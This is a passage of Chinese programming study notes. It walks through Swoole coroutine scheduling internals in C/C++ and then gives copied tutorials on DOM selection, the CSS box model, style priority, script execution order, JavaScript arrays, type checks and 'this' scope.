    ctx.SwapOut();
}
•co->resume()实现了协程的恢复操作：1）设置协程状态为SW_CORO_RUNNING；2）回调on_resume方法，即PHPCoroutine::on_resume，保存当前协程（current协程）的php栈上下文，恢复另一个协程（task代表协程）的php栈上下文；3）设置origin为当前协程对象，current为即将要换入的协程对象；4）换入协程；
void Coroutine::resume()
{
    state = SW_CORO_RUNNING;
    if (on_resume)
    {
        on_resume(task);
    }
    origin = current;
    current = this;
    ctx.SwapIn();
    if (ctx.end)
    {
        close();
    }
}
•Swoole协程有四种状态：初始化，运行中，等待运行，运行结束；定义如下：
typedef enum
{
    SW_CORO_INIT = 0,
    SW_CORO_WAITING,
    SW_CORO_RUNNING,
    SW_CORO_END,
} sw_coro_state;
•协程之间可以通过Coroutine对象的origin字段形成一个类似链表的结构；Co::yield()换出当前协程时，会换入origin协程；在A协程种调用Co::resume()恢复B协程时，会换出A协程，换入B协程，同时标记A协程为B的origin协程；

  协程切换过程比较简单，这里不做过多详述。

协程调度

  当我们调用Co::sleep()让协程休眠时，会换出当前协程；或者调用CoroutineSocket->recv()从socket接收数据，但socket数据还没有准备好时，会阻塞当前协程，从而使得协程换出。那么问题来了，什么时候再换入执行这个协程呢？

socket读写实现

  Swoole的socket读写使用的成熟的IO多路复用模型：epoll/kqueue/select/poll等，并且将其封装在结构体_swReactor中，其定义如下：
struct _swReactor
{
    //超时时间
    int32_t timeout_msec;
    
    //fd的读写事件处理函数
    swReactor_handle handle[SW_MAX_FDTYPE];        
    swReactor_handle write_handle[SW_MAX_FDTYPE];  
    swReactor_handle error_handle[SW_MAX_FDTYPE];
    
    //fd事件的注册修改删除以及wait
    //函数指针，（以epoll为例）指向的是epoll_ctl、epoll_wait
    int (*add)(swReactor *, int fd, int fdtype);
    int (*set)(swReactor *, int fd, int fdtype);
    int (*del)(swReactor *, int fd);
    int (*wait)(swReactor *, struct timeval *);
    void (*free)(swReactor *);
    
    //超时回调函数，结束、开始回调函数
    void (*onTimeout)(swReactor *);
    void (*onFinish)(swReactor *);
    void (*onBegin)(swReactor *);
}

  在调用函数PHPCoroutine::create创建协程时，会校验是否已经初始化_swReactor对象，如果没有则会调用php_swoole_reactor_init函数创建并初始化main_reactor对象；
void php_swoole_reactor_init()
{
    if (SwooleG.main_reactor == NULL)
    {

        SwooleG.main_reactor = (swReactor *) sw_malloc(sizeof(swReactor));
        
        if (swReactor_create(SwooleG.main_reactor, SW_REACTOR_MAXEVENTS) < 0)
        {
           
        }

        ……
        
        php_swoole_register_shutdown_function_prepend("swoole_event_wait");
    }
    
}

  我们以epoll为例，main_reactor各回调函数如下：
reactor->onFinish = swReactor_onFinish;
reactor->onTimeout = swReactor_onTimeout;

reactor->add = swReactorEpoll_add;
reactor->set = swReactorEpoll_set;
reactor->del = swReactorEpoll_del;
reactor->wait = swReactorEpoll_wait;
reactor->free = swReactorEpoll_free;

◆  注意：这里注册了一个函数swoole_event_wait，在生命周期register_shutdown阶段会执行该函数，开始Swoole的事件循环，阻挡了php生命周期的结束。

  类Socket封装了socket读写相关的所有操作以及数据结构，其定义如下：
class Socket
{
public:
    swConnection *socket = nullptr;

    //读写函数
    ssize_t recv(void *__buf, size_t __n);
    ssize_t send(const void *__buf, size_t __n);
    ……
    
private:

    swReactor *reactor = nullptr;
    Coroutine *read_co = nullptr;
    Coroutine *write_co = nullptr;
    
    //连接超时时间，接收数据、发送数据超时时间
    double connect_timeout = default_connect_timeout;
    double read_timeout = default_read_timeout;
    double write_timeout = default_write_timeout;
}
•socket字段类型为swConnection，代表传输层连接；
•reactor字段指向结构体swReactor对象，用于fd事件的注册、修改、删除以及wait；
•当调用recv()函数接收数据，阻塞了该协程时，read_co字段指向该协程对象Coroutine；
•当调用send()函数接收数据，阻塞了该协程时，write_co字段指向该协程对象Coroutine；
•类Socket初始化函数为Socket::init_sock：
void Socket::init_sock(int _fd)
{
    
    reactor = SwooleG.main_reactor;
    
    //设置协程类型fd（SW_FD_CORO_SOCKET）的读写事件处理函数
    if (!swReactor_handle_isset(reactor, SW_FD_CORO_SOCKET))
    {
        reactor->setHandle(reactor, SW_FD_CORO_SOCKET | SW_EVENT_READ, readable_event_callback);
        reactor->setHandle(reactor, SW_FD_CORO_SOCKET | SW_EVENT_WRITE, writable_event_callback);
        reactor->setHandle(reactor, SW_FD_CORO_SOCKET | SW_EVENT_ERROR, error_event_callback);
    }
}

  当我们调用CoroutineSocket->recv接收数据时，底层实现如下：
Socket::timeout_setter ts(sock->socket, timeout, SW_TIMEOUT_READ);
ssize_t bytes = all ? sock->socket->recv_all(ZSTR_VAL(buf), length) : sock->socket->recv(ZSTR_VAL(buf), length);
    

  类timeout_setter会设置socket的接收数据超时时间read_timeout为timeout。

  函数socket->recv_all会循环读取数据，直到读取到指定长度的数据，或者底层返回等待标识阻塞当前协程：
ssize_t Socket::recv_all(void *__buf, size_t __n)
{
 
    timer_controller timer(&read_timer, read_timeout, this, timer_callback);
    while (true)
    {
        do {
            retval = swConnection_recv(socket, (char *) __buf + total_bytes, __n - total_bytes, 0);
        } while (retval < 0 && swConnection_error(errno) == SW_WAIT && timer.start() && wait_event(SW_EVENT_READ));
        if (unlikely(retval <= 0))
        {
            break;
        }
        total_bytes += retval;
        if ((size_t) total_bytes == __n)
        {
            break;
        }
    }
}
•函数首先创建timer_controller对象，设置其超时时间为read_timeout，以及超时回调函数为timer_callback；
•while (true)死循环读取fd数据，当读取数据量等于__n时，读取操作结束，break该循环；如果读取操作swConnection_recv返回值小于0，并且错误标识为SW_WAIT，说明需要等待数据到来，此时阻塞当前协程等待数据到来（函数wait_event会换出当前协程），阻塞超时时间为read_timeout（函数timer.start()用于设置超时时间）。
class timer_controller
{
public:
    bool start()
    {
        
        if (timeout > 0)
        {
            *timer_pp = swTimer_add(&SwooleG.timer, (long) (timeout * 1000), 0, data, callback);
        }

    }
}
•函数swTimer_add用于添加一个定时器；Swoole底层定时任务是通过最小堆实现的，堆顶元素的超时时间最近；结构体_swTimer维护着Swoole内部所有的定时任务：
struct _swTimer
{
    swHeap *heap; //最小堆
    swHashMap *map; //map，定时器ID作为key
    
    //最早的定时任务触发时间
    long _next_msec;
    
    //函数指针，指向swReactorTimer_set
    int (*set)(swTimer *timer, long exec_msec);
    
    //函数指针，指向swReactorTimer_free
    void (*free)(swTimer *timer);
};
•当调用swTimer_add向_swTimer结构中添加定时任务时，需要更新_swTimer中最早的定时任务触发时间_next_msec，同时更新main_reactor对象的超时时间：
if (timer->_next_msec < 0 || timer->_next_msec > _msec)
{
    timer->set(timer, _msec);
    timer->_next_msec = _msec;
}

static int swReactorTimer_set(swTimer *timer, long exec_msec)
{
    SwooleG.main_reactor->timeout_msec = exec_msec;
    return SW_OK;
}
•函数wait_event负责将当前协程换出，直到注册的事件发生
bool Socket::wait_event(const enum swEvent_type event, const void **__buf, size_t __n)
{
    if (unlikely(!add_event(event)))
    {
        return false;
    }
    
    if (likely(event == SW_EVENT_READ))
    {
        read_co = co;
        read_co->yield();
        read_co = nullptr;
    }
    else // if (event == SW_EVENT_WRITE)
    {
        write_co = co;
        write_co->yield();
        write_co = nullptr;
    }
}
•函数add_event用于添加事件，底层调用reactor->add添加fd的监听事件；
•read_co = co或者write_co = co，用于记录当前哪个协程阻塞在该socket对象上，当该socket对象的读写事件被触发时，可以恢复该协程执行；
•函数yield()将该协程换出；

  上面提到，创建协程时，注册了一个函数swoole_event_wait，在生命周期register_shutdown阶段会执行该函数，开始Swoole的事件循环，阻挡了php生命周期的结束。函数swoole_event_wait底层就是调用main_reactor->wait等待fd读写事件的产生；我们以epoll为例讲述事件循环的逻辑：
static int swReactorEpoll_wait(swReactor *reactor, struct timeval *timeo)
{
    while (reactor->running > 0)
    {
        n = epoll_wait(epoll_fd, events, max_event_num, swReactor_get_timeout_msec(reactor));
        
        if (n == 0)
        {
            if (reactor->onTimeout != NULL)
            {
                reactor->onTimeout(reactor);
            }
            SW_REACTOR_CONTINUE;
        }
        
        for (i = 0; i < n; i++)
        {
            if ((events[i].events & EPOLLIN) && !event.socket->removed)
            {
                handle = swReactor_getHandle(reactor, SW_EVENT_READ, event.type);
                ret = handle(reactor, &event);
                
            }
            
            if ((events[i].events & EPOLLOUT) && !event.socket->removed)
            {
                handle = swReactor_getHandle(reactor, SW_EVENT_WRITE, event.type);
                ret = handle(reactor, &event);
               
            }
        }
    }
}
•swReactorEpoll_wait是对函数epoll_wait的封装；当有读写事件发生时，执行相应的handle，根据上面的讲解我们知道读写事件的handle分别为readable_event_callback和writable_event_callback；
int Socket::readable_event_callback(swReactor *reactor, swEvent *event)
{
    Socket *socket = (Socket *) event->socket->object;

    socket->read_co->resume();

}
•可以看到函数readable_event_callback只是简单的恢复read_co协程即可；
•当epoll_wait发生超时，最终调用的是函数swReactor_onTimeout，该函数会从Swoole维护的一系列定时任务swTimer中查找已经超时的定时任务，同时执行其callback回调；
while ((tmp = swHeap_top(timer->heap)))
{
    tnode = tmp->data;
    if (tnode->exec_msec > now_msec || tnode->round == timer->round)
    {
        break;
    }

    timer->_current_id = tnode->id;
    if (!tnode->remove)
    {
        tnode->callback(timer, tnode);
    }
    
    ……
}

//该定时任务没有超时，需要更新需要更新_swTimer中最早的定时任务触发时间_next_msec
long next_msec = tnode->exec_msec - now_msec;
if (next_msec <= 0)
{
    next_msec = 1;
}
//同时更新main_reactor对象的超时时间，实现函数为swReactorTimer_set
timer->set(timer, next_msec);

•该callback回调函数即为上面设置的timer_callback：
void Socket::timer_callback(swTimer *timer, swTimer_node *tnode)
{
    Socket *socket = (Socket *) tnode->data;
    socket->set_err(ETIMEDOUT);
    if (likely(tnode == socket->read_timer))
    {
        socket->read_timer = nullptr;
        socket->read_co->resume();
    }
    else if (tnode == socket->write_timer)
    {
        socket->write_timer = nullptr;
        socket->write_co->resume();
    }
}
•同样的，timer_callback函数只是简单的恢复read_co或者write_co协程即可

sleep实现

  Co::sleep()的实现函数为PHP_METHOD(swoole_coroutine_util, sleep)，该函数通过调用Coroutine::sleep实现了协程休眠的功能：
int Coroutine::sleep(double sec)
{
    Coroutine* co = Coroutine::get_current_safe();
    if (swTimer_add(&SwooleG.timer, (long) (sec * 1000), 0, co, sleep_timeout) == NULL)
    {
        return -1;
    }
    co->yield();
    return 0;
}

  可以看到，与socket读写事件超时处理相同，sleep内部实现时通过swTimer_add添加定时任务，同时换出当前协程实现的。该定时任务会导致main_reactor对象的超时时间的改变，即修改了epoll_wait的超时时间。

  sleep的超时处理函数为sleep_timeout，只需要换入该阻塞协程对象即可，实现如下：
static void sleep_timeout(swTimer *timer, swTimer_node *tnode)
{
    ((Coroutine *) tnode->data)->resume();
}
```

## 前端篇

### 原生获取 DOM 节点，属性
```
https://www.cnblogs.com/zero18/p/10998642.html
JS获取DOM元素的方法（8种）

通过ID获取（getElementById）
通过name属性（getElementsByName）
通过标签名（getElementsByTagName）
通过类名（getElementsByClassName）
通过选择器获取一个元素（querySelector）
通过选择器获取一组元素（querySelectorAll）
获取html的方法（document.documentElement）
document.documentElement是专门获取html这个标签的
获取body的方法（document.body）
document.body是专门获取body这个标签的。
1.通过ID获取（getElementById）

document.getElementById('id')
上下文必须是document。
必须传参数，参数是string类型，是获取元素的id。
返回值只获取到一个元素，没有找到返回null。
2.通过name属性（getElementsByName）

document.getElementsByName('name')
上下文必须是document。内容
必须传参数，参数是是获取元素的name属性。
返回值是一个类数组，没有找到返回空数组。
3.通过标签名（getElementsByTagName）

复制代码
var obj = document.getElementsByTagName('div');
                for(let i = 0; i<obj.length; i++){
                        obj[i].onclick = function(e){
                            console.log(i)
                        }
                    }
复制代码
上下文可以是document，也可以是一个元素，注意这个元素一定要存在。
参数是是获取元素的标签名属性，不区分大小写。
返回值是一个类数组，没有找到返回空数组
4.通过类名（getElementsByClassName

复制代码
var obj1 = document.getElementsByClassName('animated')
                // console.log
                0:div.app.animated
                1:div#login.login.animated.rubberBand
                2:div#reg.reg.animated.shake
                3:div#kefu.kefu.animated.swing
                4:div#LoginState.state.animated.bounce
                5:div.loginState.animated
                6:div.regState.animated
                7:div.pop.animated
复制代码
上下文可以是document，也可以是一个元素。
参数是元素的类名。
返回值是一个类数组，没有找到返回空数组。
5.通过选择器获取一个元素（querySelector）

document.querySelector('.animated')
上下文可以是document，也可以是一个元素。
参数是选择器，如：”div .className”。
返回值只获取到第一个元素。
6.通过选择器获取一组元素（querySelectorAll）

document.querySelector('.animated')
上下文可以是document，也可以是一个元素。
参数是选择器，如：”div .className”。
返回值是一个类数组。
转载于:查看原创请点击此处

每天进步一点点！！
            </div>
        </div>
        <script
            type="text/javascript">var allowComments = true, cb_blogId = 435113, cb_entryId = 10131782, cb_blogApp = currentBlogApp, cb_blogUserGuid = '9c5d6448-89d6-4f8c-fd00-08d5a823ae5e', cb_entryCreatedDate = '2018/12/17 15:27:00'; loadViewCount(cb_entryId); var cb_postType = 1; var isMarkdown = false;</script>

    </div>
    <!--end: topics 文章、评论容器-->
</div>
```

### 盒子模型
```
https://www.runoob.com/css/css-boxmodel.html
CSS 盒子模型(Box Model)
所有HTML元素可以看作盒子，在CSS中，"box model"这一术语是用来设计和布局时使用。

CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。

盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。

下面的图片说明了盒子模型(Box Model)：


CSS box-model
不同部分的说明：

Margin(外边距) - 清除边框外的区域，外边距是透明的。
Border(边框) - 围绕在内边距和内容外的边框。
Padding(内边距) - 清除内容周围的区域，内边距是透明的。
Content(内容) - 盒子的内容，显示文本和图像。
为了正确设置元素在所有浏览器中的宽度和高度，你需要知道的盒模型是如何工作的。

元素的宽度和高度
Remark重要: 当您指定一个 CSS 元素的宽度和高度属性时，你只是设置内容区域的宽度和高度。要知道，完整大小的元素，你还必须添加内边距，边框和边距。

下面的例子中的元素的总宽度为300px：

实例
div {
    width: 300px;
    border: 25px solid green;
    padding: 25px;
    margin: 25px;
}

尝试一下 »
让我们自己算算：
300px (宽)
+ 50px (左 + 右填充)
+ 50px (左 + 右边框)
+ 50px (左 + 右边距)
= 450px

试想一下，你只有250像素的空间。让我们设置总宽度为250像素的元素:

实例
div {
    width: 220px;
    padding: 10px;
    border: 5px solid gray;
    margin: 0; 
}

尝试一下 »
最终元素的总宽度计算公式是这样的：

总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距

元素的总高度最终计算公式是这样的：

总元素的高度=高度+顶部填充+底部填充+上边框+下边框+上边距+下边距

浏览器的兼容性问题
一旦为页面设置了恰当的 DTD，大多数浏览器都会按照上面的图示来呈现内容。然而 IE 5 和 6 的呈现却是不正确的。根据 W3C 的规范，元素内容占据的空间是由 width 属性设置的，而内容周围的 padding 和 border 值是另外计算的。不幸的是，IE5.X 和 6 在怪异模式中使用自己的非标准模型。这些浏览器的 width 属性不是内容的宽度，而是内容、内边距和边框的宽度的总和。

虽然有方法解决这个问题。但是目前最好的解决方案是回避这个问题。也就是，不要给元素添加具有指定宽度的内边距，而是尝试将内边距或外边距添加到元素的父元素和子元素。

IE8 及更早IE版本不支持设置填充的宽度和边框的宽度属性。

解决IE8及更早版本不兼容问题可以在HTML页面声明 <!DOCTYPE html>即可。
```

### CSS 文件、style 标签、行内 style 属性优先级
```
　　一个网页由html元素与CSS样式合作打造，html元素用来排版布局，CSS样式用来修饰。而html元素与CSS样式是各自独立的，各发挥各的作用。CSS样式可以在三个地方定义，分别为：CSS文件、html网页内和元素的style属性中，问题来了，如果同时在两个地方定义了同一个CSS样式，那么谁发生作用？在CSS样式中，不存在两个同名同属性的CSS共同发挥作用的问题，所以只有CSS作用顺序或者说CSS优先级的问题。对于不同名并不同属性的CSS样式，它们可以同时修饰html元素，因而一个 class 中可以有多个CSS样式。

　　我们已经知道在CSS文件、html页与style属性中都可以定义CSS样式，它们的作用顺序优先级遵循离 class 近的原则，说到这里想必你已经知道谁先谁后了。

 

　　一、CSS优先级
　　1、style属性中的CSS样式；

　　2、html页中<style></style>之间的CSS样式；

　　3、CSS文件中的CSS样式。

　　从上面的排序可以看出，CSS优先级确实遵循离 class 属性近的原则。

 

　　二、CSS优先级举例
　　html元素：

　　<div class="cssorder" style="color:Red">CSS优先级，文件、本页与style属性谁先谁后</div>

　　CSS样式：

　　<style type="text/css">
　　　cssorder{color:Blue; width:350px; height:30px; border:1px solid #929292; line-height:28px; padding-left:8px;}
    </style>
CSS优先级，文件、本页与style属性谁先谁后
　　从效果图中可以看出，如果在CSS样式和style属性中同时定义了，则style属性中的发挥作用。例如：在CSS样式 cssorder 中把 color 定义为“蓝色”，在style属性中把 color 定义为“红色”，结果文字显示为红色。而style属性中没有定义的，则CSS样式 cssorder 定义了的，则CSS样式中的发挥作用。
```

### HTML 与 JS 运行顺序（页面 JS 从上到下）
```
https://www.cnblogs.com/xiaoxiaoqiang001/p/5331322.html
JS在html中的执行顺序
    一般来说在html页面中嵌入Javascript的方式有下面几种：1.放在页面的<script></script>标记之间；2.由<script>标记的src属性引入外部的js文件；3.放在页面元素的事件处理程序中，比如button的onclick事件中；4.作为URL的主体，使用Javascript:协议，比如<a href="window.open("about:blank");"></a>;5.Javascript本身的document.write()写入的JavaScript代码；6.利用Ajax异步获取javascript代码.其中3,4需要事件的事件的触发才能执行，除非特别设置一般在页面加载时不会执行。5，6可以看做是js代码动态调用执行的，一般是在调用该代码的js执行时执行。

  下面看看<script></script>在html中所放的不同位置来看js的执行顺序。

js代码在js外部文件和<script></script>内的区别：

1
2
3
4
5
6
7
8
9
10
11
12
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript"src="test.js" ></script>
    <script type="text/javascript">
        alert("head中js");
        </script>
</head>
<body>
</body>
</html>
其中test.js为外部js文件，代码为：

1
alert("文件中js");
程序运行结果为先打印"文件中js"，再打印"head中js"，如果把<script src="test.js">放在后面，则是先输出"head中js",即浏览器是按<script>载入的先后顺序执行的。

一般来说每个脚本定义的全局变量和函数，都可以被后面执行的脚本所调用。变量的调用必须是在前面已经声明, 否则是undefined。而函数的调用可以在函数定义之前,前提是函数调用与定义在同一个<script></script>中，看下面的代码：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript">
        alert(str);//程序打印出，undefined
       Sayhello("小明");//程序打印出，小明你好
        function Sayhello(name)
        {
            alert(name+"你好!");
        }
        var str="abcd";
        </script>
</head>
<body>
</body>
</html>
复制代码
函数定义可以出现在函数调用的后面，但是如果是分别在两段代码，且函数调用在前面代码中，则会报函数未定义错误。

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript">
        Sayhello("小明");//浏览器报错Sayhello未定义
    </script>
    <script type="text/javascript">
        function Sayhello(name)
        {
            alert(name+"你好!");
        }
        var str="abcd";
        </script>
    <script type="text/javascript">
        Sayhello("小红");
        alert(str);
        </script>
</head>
<body>
</body>
</html>
复制代码
程序正常打印''小红你好''和''abcd''。

在实际js的编程中，可能会页面<script>标签内的js代码中调用外部js文件中的变量或函数，这个需要js文件的加载在前，而调用在后。下面的代码可以说明：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript" src="test.js"></script>
   <script type="text/javascript">
       alert(num1);
       alert(num2)
      alert(sum(3,7));
   </script>
</head>
<body>
</body>
</html>
复制代码
test.js中的代码：

var num1=2;
var num2=3;
function sum(a,b)
{
    return a+b;
}
程序正常输出，如果把test.js放在后面，调用却在前面，会出现undefined的错误。如果把js文件test.js放在后可以调用前面html页面<script>标签中的变量和函数，也可以调用前面的js文件中定义的变量和函数。

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
   <script type="text/javascript">
       var string1="abc";
       var string2="def";
       function Print(str1,str2)
       {
         alert(str1+str2) ;
       }
   </script>
    <script type="text/javascript" src="test.js"></script>
</head>
<body>
</body>
</html>
复制代码
上面程序中string1，string2，Print声明或定义在前，在test.js中调用，test.js的代码为：

alert(string1);//输出abc
alert(string2);//输出def
var str1="12";
var str2="34";
Print(str1,str2);//输出1234
后面引用的js文件调用前面js文件中定义的变量和函数，把前面的html改为如下：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript" src="test02.js"></script>
    <script type="text/javascript" src="test.js"></script>
</head>
<body>
</body>
</html>
复制代码
test.js中的代码不变，调用前面test02.js中定义变量和函数，test02.js的代码如下：

var string1="abc";
var string2="def";
function Print(str1,str2)
{
    alert(str1+str2) ;
}
程序运行结果与前面一样，上面程序交换test.js和test02.js的先后会出现undefined的错误。这充分说明js外部文件和页面内<script>标签里的js代码一样，让先后顺序加载执行的。
下面来看看<script>加入html的不同位置执行的顺序：在<head>和<body>中以及与页面元素加载的先后关系

下面的程序对比<head>和<body>中js的执行顺序：

复制代码
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript">
        alert("我在head中");
    </script>
</head>
<body>
<script type="text/javascript">
    alert("我在body中");
</script>
</body>
</html>
复制代码
上面程序先弹出"我在head中"后body中，与页面加载的顺序一致。放入<body>中的js随页面元素加载时执行。可以把js放在</html>的后面，在页面加载完成后执行，相当于onload事件中的代码。

综合上面所述情况可以归结为一点，即JavaScript代码是按页面加载的先后顺序执行的。（注上述代码在不同浏览器中执行的结果会有一些小差异）。
```

### JS 数组操作
```
https://www.cnblogs.com/lzm1989/p/5967815.html
shift:删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.shift(); //a:[2,3,4,5] b:1  


unshift:将参数添加到原数组开头，并返回数组的长度 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.unshift(-2,-1); //a:[-2,-1,1,2,3,4,5] b:7   

注:在IE6.0下测试返回值总为undefined，FF2.0下测试返回值为7，所以这个方法的返回值不可靠，需要用返回值时可用splice代替本方法来使用。 

pop:删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.pop(); //a:[1,2,3,4] b:5  


push:将参数添加到原数组末尾，并返回数组的长度 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.push(6,7); //a:[1,2,3,4,5,6,7] b:7  


concat:返回一个新数组，是将参数添加到原数组中构成的 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.concat(6,7); //a:[1,2,3,4,5] b:[1,2,3,4,5,6,7]  


splice(start,deleteCount,val1,val2,...):从start位置开始删除deleteCount项，并从该位置起插入val1,val2,... 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.splice(2,2,7,8,9); //a:[1,2,7,8,9,5] b:[3,4]   
var b = a.splice(0,1); //同shift   
a.splice(0,0,-2,-1); var b = a.length; //同unshift   
var b = a.splice(a.length-1,1); //同pop   
a.splice(a.length,0,6,7); var b = a.length; //同push  


reverse:将数组反序 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.reverse(); //a:[5,4,3,2,1] b:[5,4,3,2,1]  


sort(orderfunction):按指定的参数对数组进行排序 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.sort(); //a:[1,2,3,4,5] b:[1,2,3,4,5]  


slice(start,end):返回从原数组中指定开始下标到结束下标之间的项组成的新数组 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.slice(2,5); //a:[1,2,3,4,5] b:[3,4,5]  


join(separator):将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符 

Javascript代码  收藏代码
var a = [1,2,3,4,5];   
var b = a.join("|"); //a:[1,2,3,4,5] b:"1|2|3|4|5"  




数组是JavaScript提供的一个内部对象，它是一个标准的集合，我们可以添加(push)、删除(shift)里面元素，我们还可以通过for循环遍历里面的元素，那么除了数组我们在JavaScript里还可以有别的集合吗? 

　　由于JavaScript的语言特性，我们可以向通用对象动态添加和删除属性。所以Object也可以看成是JS的一种特殊的集合。下面比较一下Array和Object的特性: 


Javascript代码  收藏代码
　　//Array:  
  
/*新建:*/var ary = new Array(); 或 var ary = [];   
/*增加:*/ary.push(value);   
/*删除:*/delete ary[n];   
/*遍历:*/for ( var i=0 ; i < ary.length ; ++i ) ary[i];  
  
　　//Object:  
  
/*新建:*/var obj = new Object(); 或 var obj = {};   
/*增加:*/obj[key] = value; (key为string)   
/*删除:*/delete obj[key];   
/*遍历:*/for ( var key in obj ) obj[key];  


　　从上面的比较可以看出Object完全可以作为一个集合来使用，在使用Popup窗口创建无限级Web页菜单(3)中我介绍过Eric实现的那个__MenuCache__，它也就是一个模拟的集合对象。 

　　如果我们要在Array中检索出一个指定的值，我们需要遍历整个数组: 

　　 
代码: 

Javascript代码  收藏代码
var keyword = ;   
　　for ( var i=0 ; i < ary.length ; ++i )   
　　{   
　　if ( ary[i] == keyword )   
　　{   
　　// todo   
　　}   
　　}  




　　而我们在Object中检索一个指定的key的条目，只需要是要使用: 

　　 
代码: 

Javascript代码  收藏代码
var key = '';   
　　var value = obj[key];   
　　// todo  


　Object的这个特性可以用来高效的检索Unique的字符串集合，遍历Array的时间复杂度是O(n)，而遍历Object的时间复杂度是O(1)。虽然对于10000次集合的for检索代价也就几十ms，可是如果是1000*1000次检索或更多，使用Object的优势一下就体现出来了。在此之前我做了一个mapping，把100个Unique的字符mapping到1000个字符串数组上，耗时25-30s!后来把for遍历改成了Object模拟的集合的成员引用，同样的数据量mapping，耗时仅1.7-2s!!! 

　　对于集合的遍历效率(从高到低):var value = obj[key]; > for ( ; ; ) > for ( in )。效率最差的就是for( in )了，如果集合过大，尽量不要使用for ( in )遍历。
```

### 类型判断
```
https://www.cnblogs.com/wilfredo/p/10489142.html
因为JS的arguments是弱类型的。所以多数场合下，对于arguments进行判断，然后针对不同类型进行不同处理（类似Java的重载）。

JS语言中数据类型共有6种，5种基本数据类型：Unfined, Null, Boolean, Number, String，还有特殊类型Object。

判断方法有很多，这里列举三个： typeof， instanceof, Object.prototype.toString.call()。下面分别说明其用途：

1. typeof

　　用的最频繁的一种判断方式，适用于基本类型和函数判断。不适用于Object类型的进一步判断。

　　

　　补充：

当变量不存在时，if (variable) 会抛出异常，而 typeof variable === 'undefined'则适用
typeof NaN 为 "number"，针对NaN需要进一步结合 isNaN()来判断
　2. instanceof

　　a instanceof b: 判断b是否是a的原型，返回 true / false

　　适用于引用类型的进一步判断。　

var a = [];

//针对array的检测
console.log(a instanceof Array); //true
console.log(a instanceof Object); //true,因为Array是Object子集
　　进一步的了解，可以参考https://www.cnblogs.com/Trr-984688199/p/6180040.html。

　3. Object.prototype.toString.call()

复制代码
var a = [1, 2];
Object.prototype.toString.call(a);     // "[object Array]"

a = {};
Object.prototype.toString.call(a);  　　// "[object Object]"

a = "123";
Object.prototype.toString.call(a);  　　// "[object String]"

a = 1;
Object.prototype.toString.call(a);  　　// "[object Number]"

a = true;
Object.prototype.toString.call(a);  　　// "[object Boolean]"

a = function() {};
Object.prototype.toString.call(a);  　　// "[object Function]"
复制代码
 

 4. 其他 

Array.isArray： 用于确定传递的值是否是一个 Array， 返回true / false
```

### this 作用域
```
https://www.cnblogs.com/wxy1233/p/9892264.html
一.作用域:浏览器给js的一个生存环境 (栈内存)。

二.作用域链:js中的关键字var和fuanction都可以提前声明和定义，提前声明和定义的放在我们的内存地址 (堆内存)中。

     然后js从上到下逐行执行，遇到变量就去内存地址查找是否存在这个变量，如果有就使用，没有就继续向父级作用域

     查找直到window下结束，这种查找机制叫做作用域链。  

 三.Js代码中存在大量的变量和函数，我们在使用它们的时候一定要知道它们到底归属谁。

四.This

    1.this是js的一个关键字，指定一个对象然后去替代它。

      函数内的this和函数外的this，函数内的this指向行为发生的主体。函数外的this都指向window没有意义。



 为什么还是window？

因为浏览器执行js代码的时候在执行chifan()这个函数的时候查找到变量chifan的归属是window，在window下的

变量可以写成window.chifan函数可以写成window.chifan()

   2.函数内的this和函数在什么环境中定义没有关系，而只和自己的主体有关。

   3.主体怎么找？

            就看函数 (方法)带不带“.”，如果函数和方法执行时带“.”，那么this就指向“.”前面的对象，如果不带“.”，就

           指向window  

   4.自执行函数里面的this都指向window。



     This和变量面试题，先找this的主体是谁，然后把它换成那个主体就行啦

   5.给元素中的某一事件绑定方法，当事件触发时，执行绑定的方法，方法中的this指向当前元素。



     重点是函数套函数的时候，不管它怎么定义，关键是看它执行时候的主体。

     360经典面试



js的数据类型

      基本数据类型: String  Undefined Null Boolean  Number

      引用数据类型: Object  Array Function

     二者的区别:

    基本数据类型就是简单的操作值，引用数据类型，把引用地址赋值给变量



堆内存

      就是存放代码块的，存放形式有两种，一种是对象以键值对的形式存放   

     另一种就是函数 以字符串的形式存放。



案例:



引用数据类型的赋值，是把引用地址赋给它，在修改属性的时候，通过地址查找然后改掉。





应用数据类型，如何操作？

      先通过引用地址去查找堆内存中的代码，然后再去修改

 

This研究在函数内部

    在js中的函数形式的种类

        1.   普通函数   function  fn(){}    var fn = function ()

        2.  类

   对象 Object

       对象里面的数据以键值对的形式存在。跟json一样。

       1.  单例模式



我们把变量zhang的li叫“命名空间”

作用域和堆内存的区别

      作用域是函数执行的时候产生 fn()

      函数执行的时候首先会开辟一个新的内存空间叫栈内存 (环境或作用域)

     数据类型在赋值的时候会开辟一个新的内存空间叫堆内存 (存放代码块的)

     二者都会形成一个内存地址

生成对象的单例模式

    优势，每个对象都是独立的，即便属性起的名字一样，不会相互干扰，方便现在流行的

   开发模式“模块化开发”。如果需要使用里面的属性，用运算符 如 zhang.name 或 zhang

["name"]，判断一个属性是不是这个对象的用in运算符 如 “name”in zhang 如果遍历这个

对象用for(attr in zhang){}

     缺点,不可以批量生产，只能一个一个去创建。
```

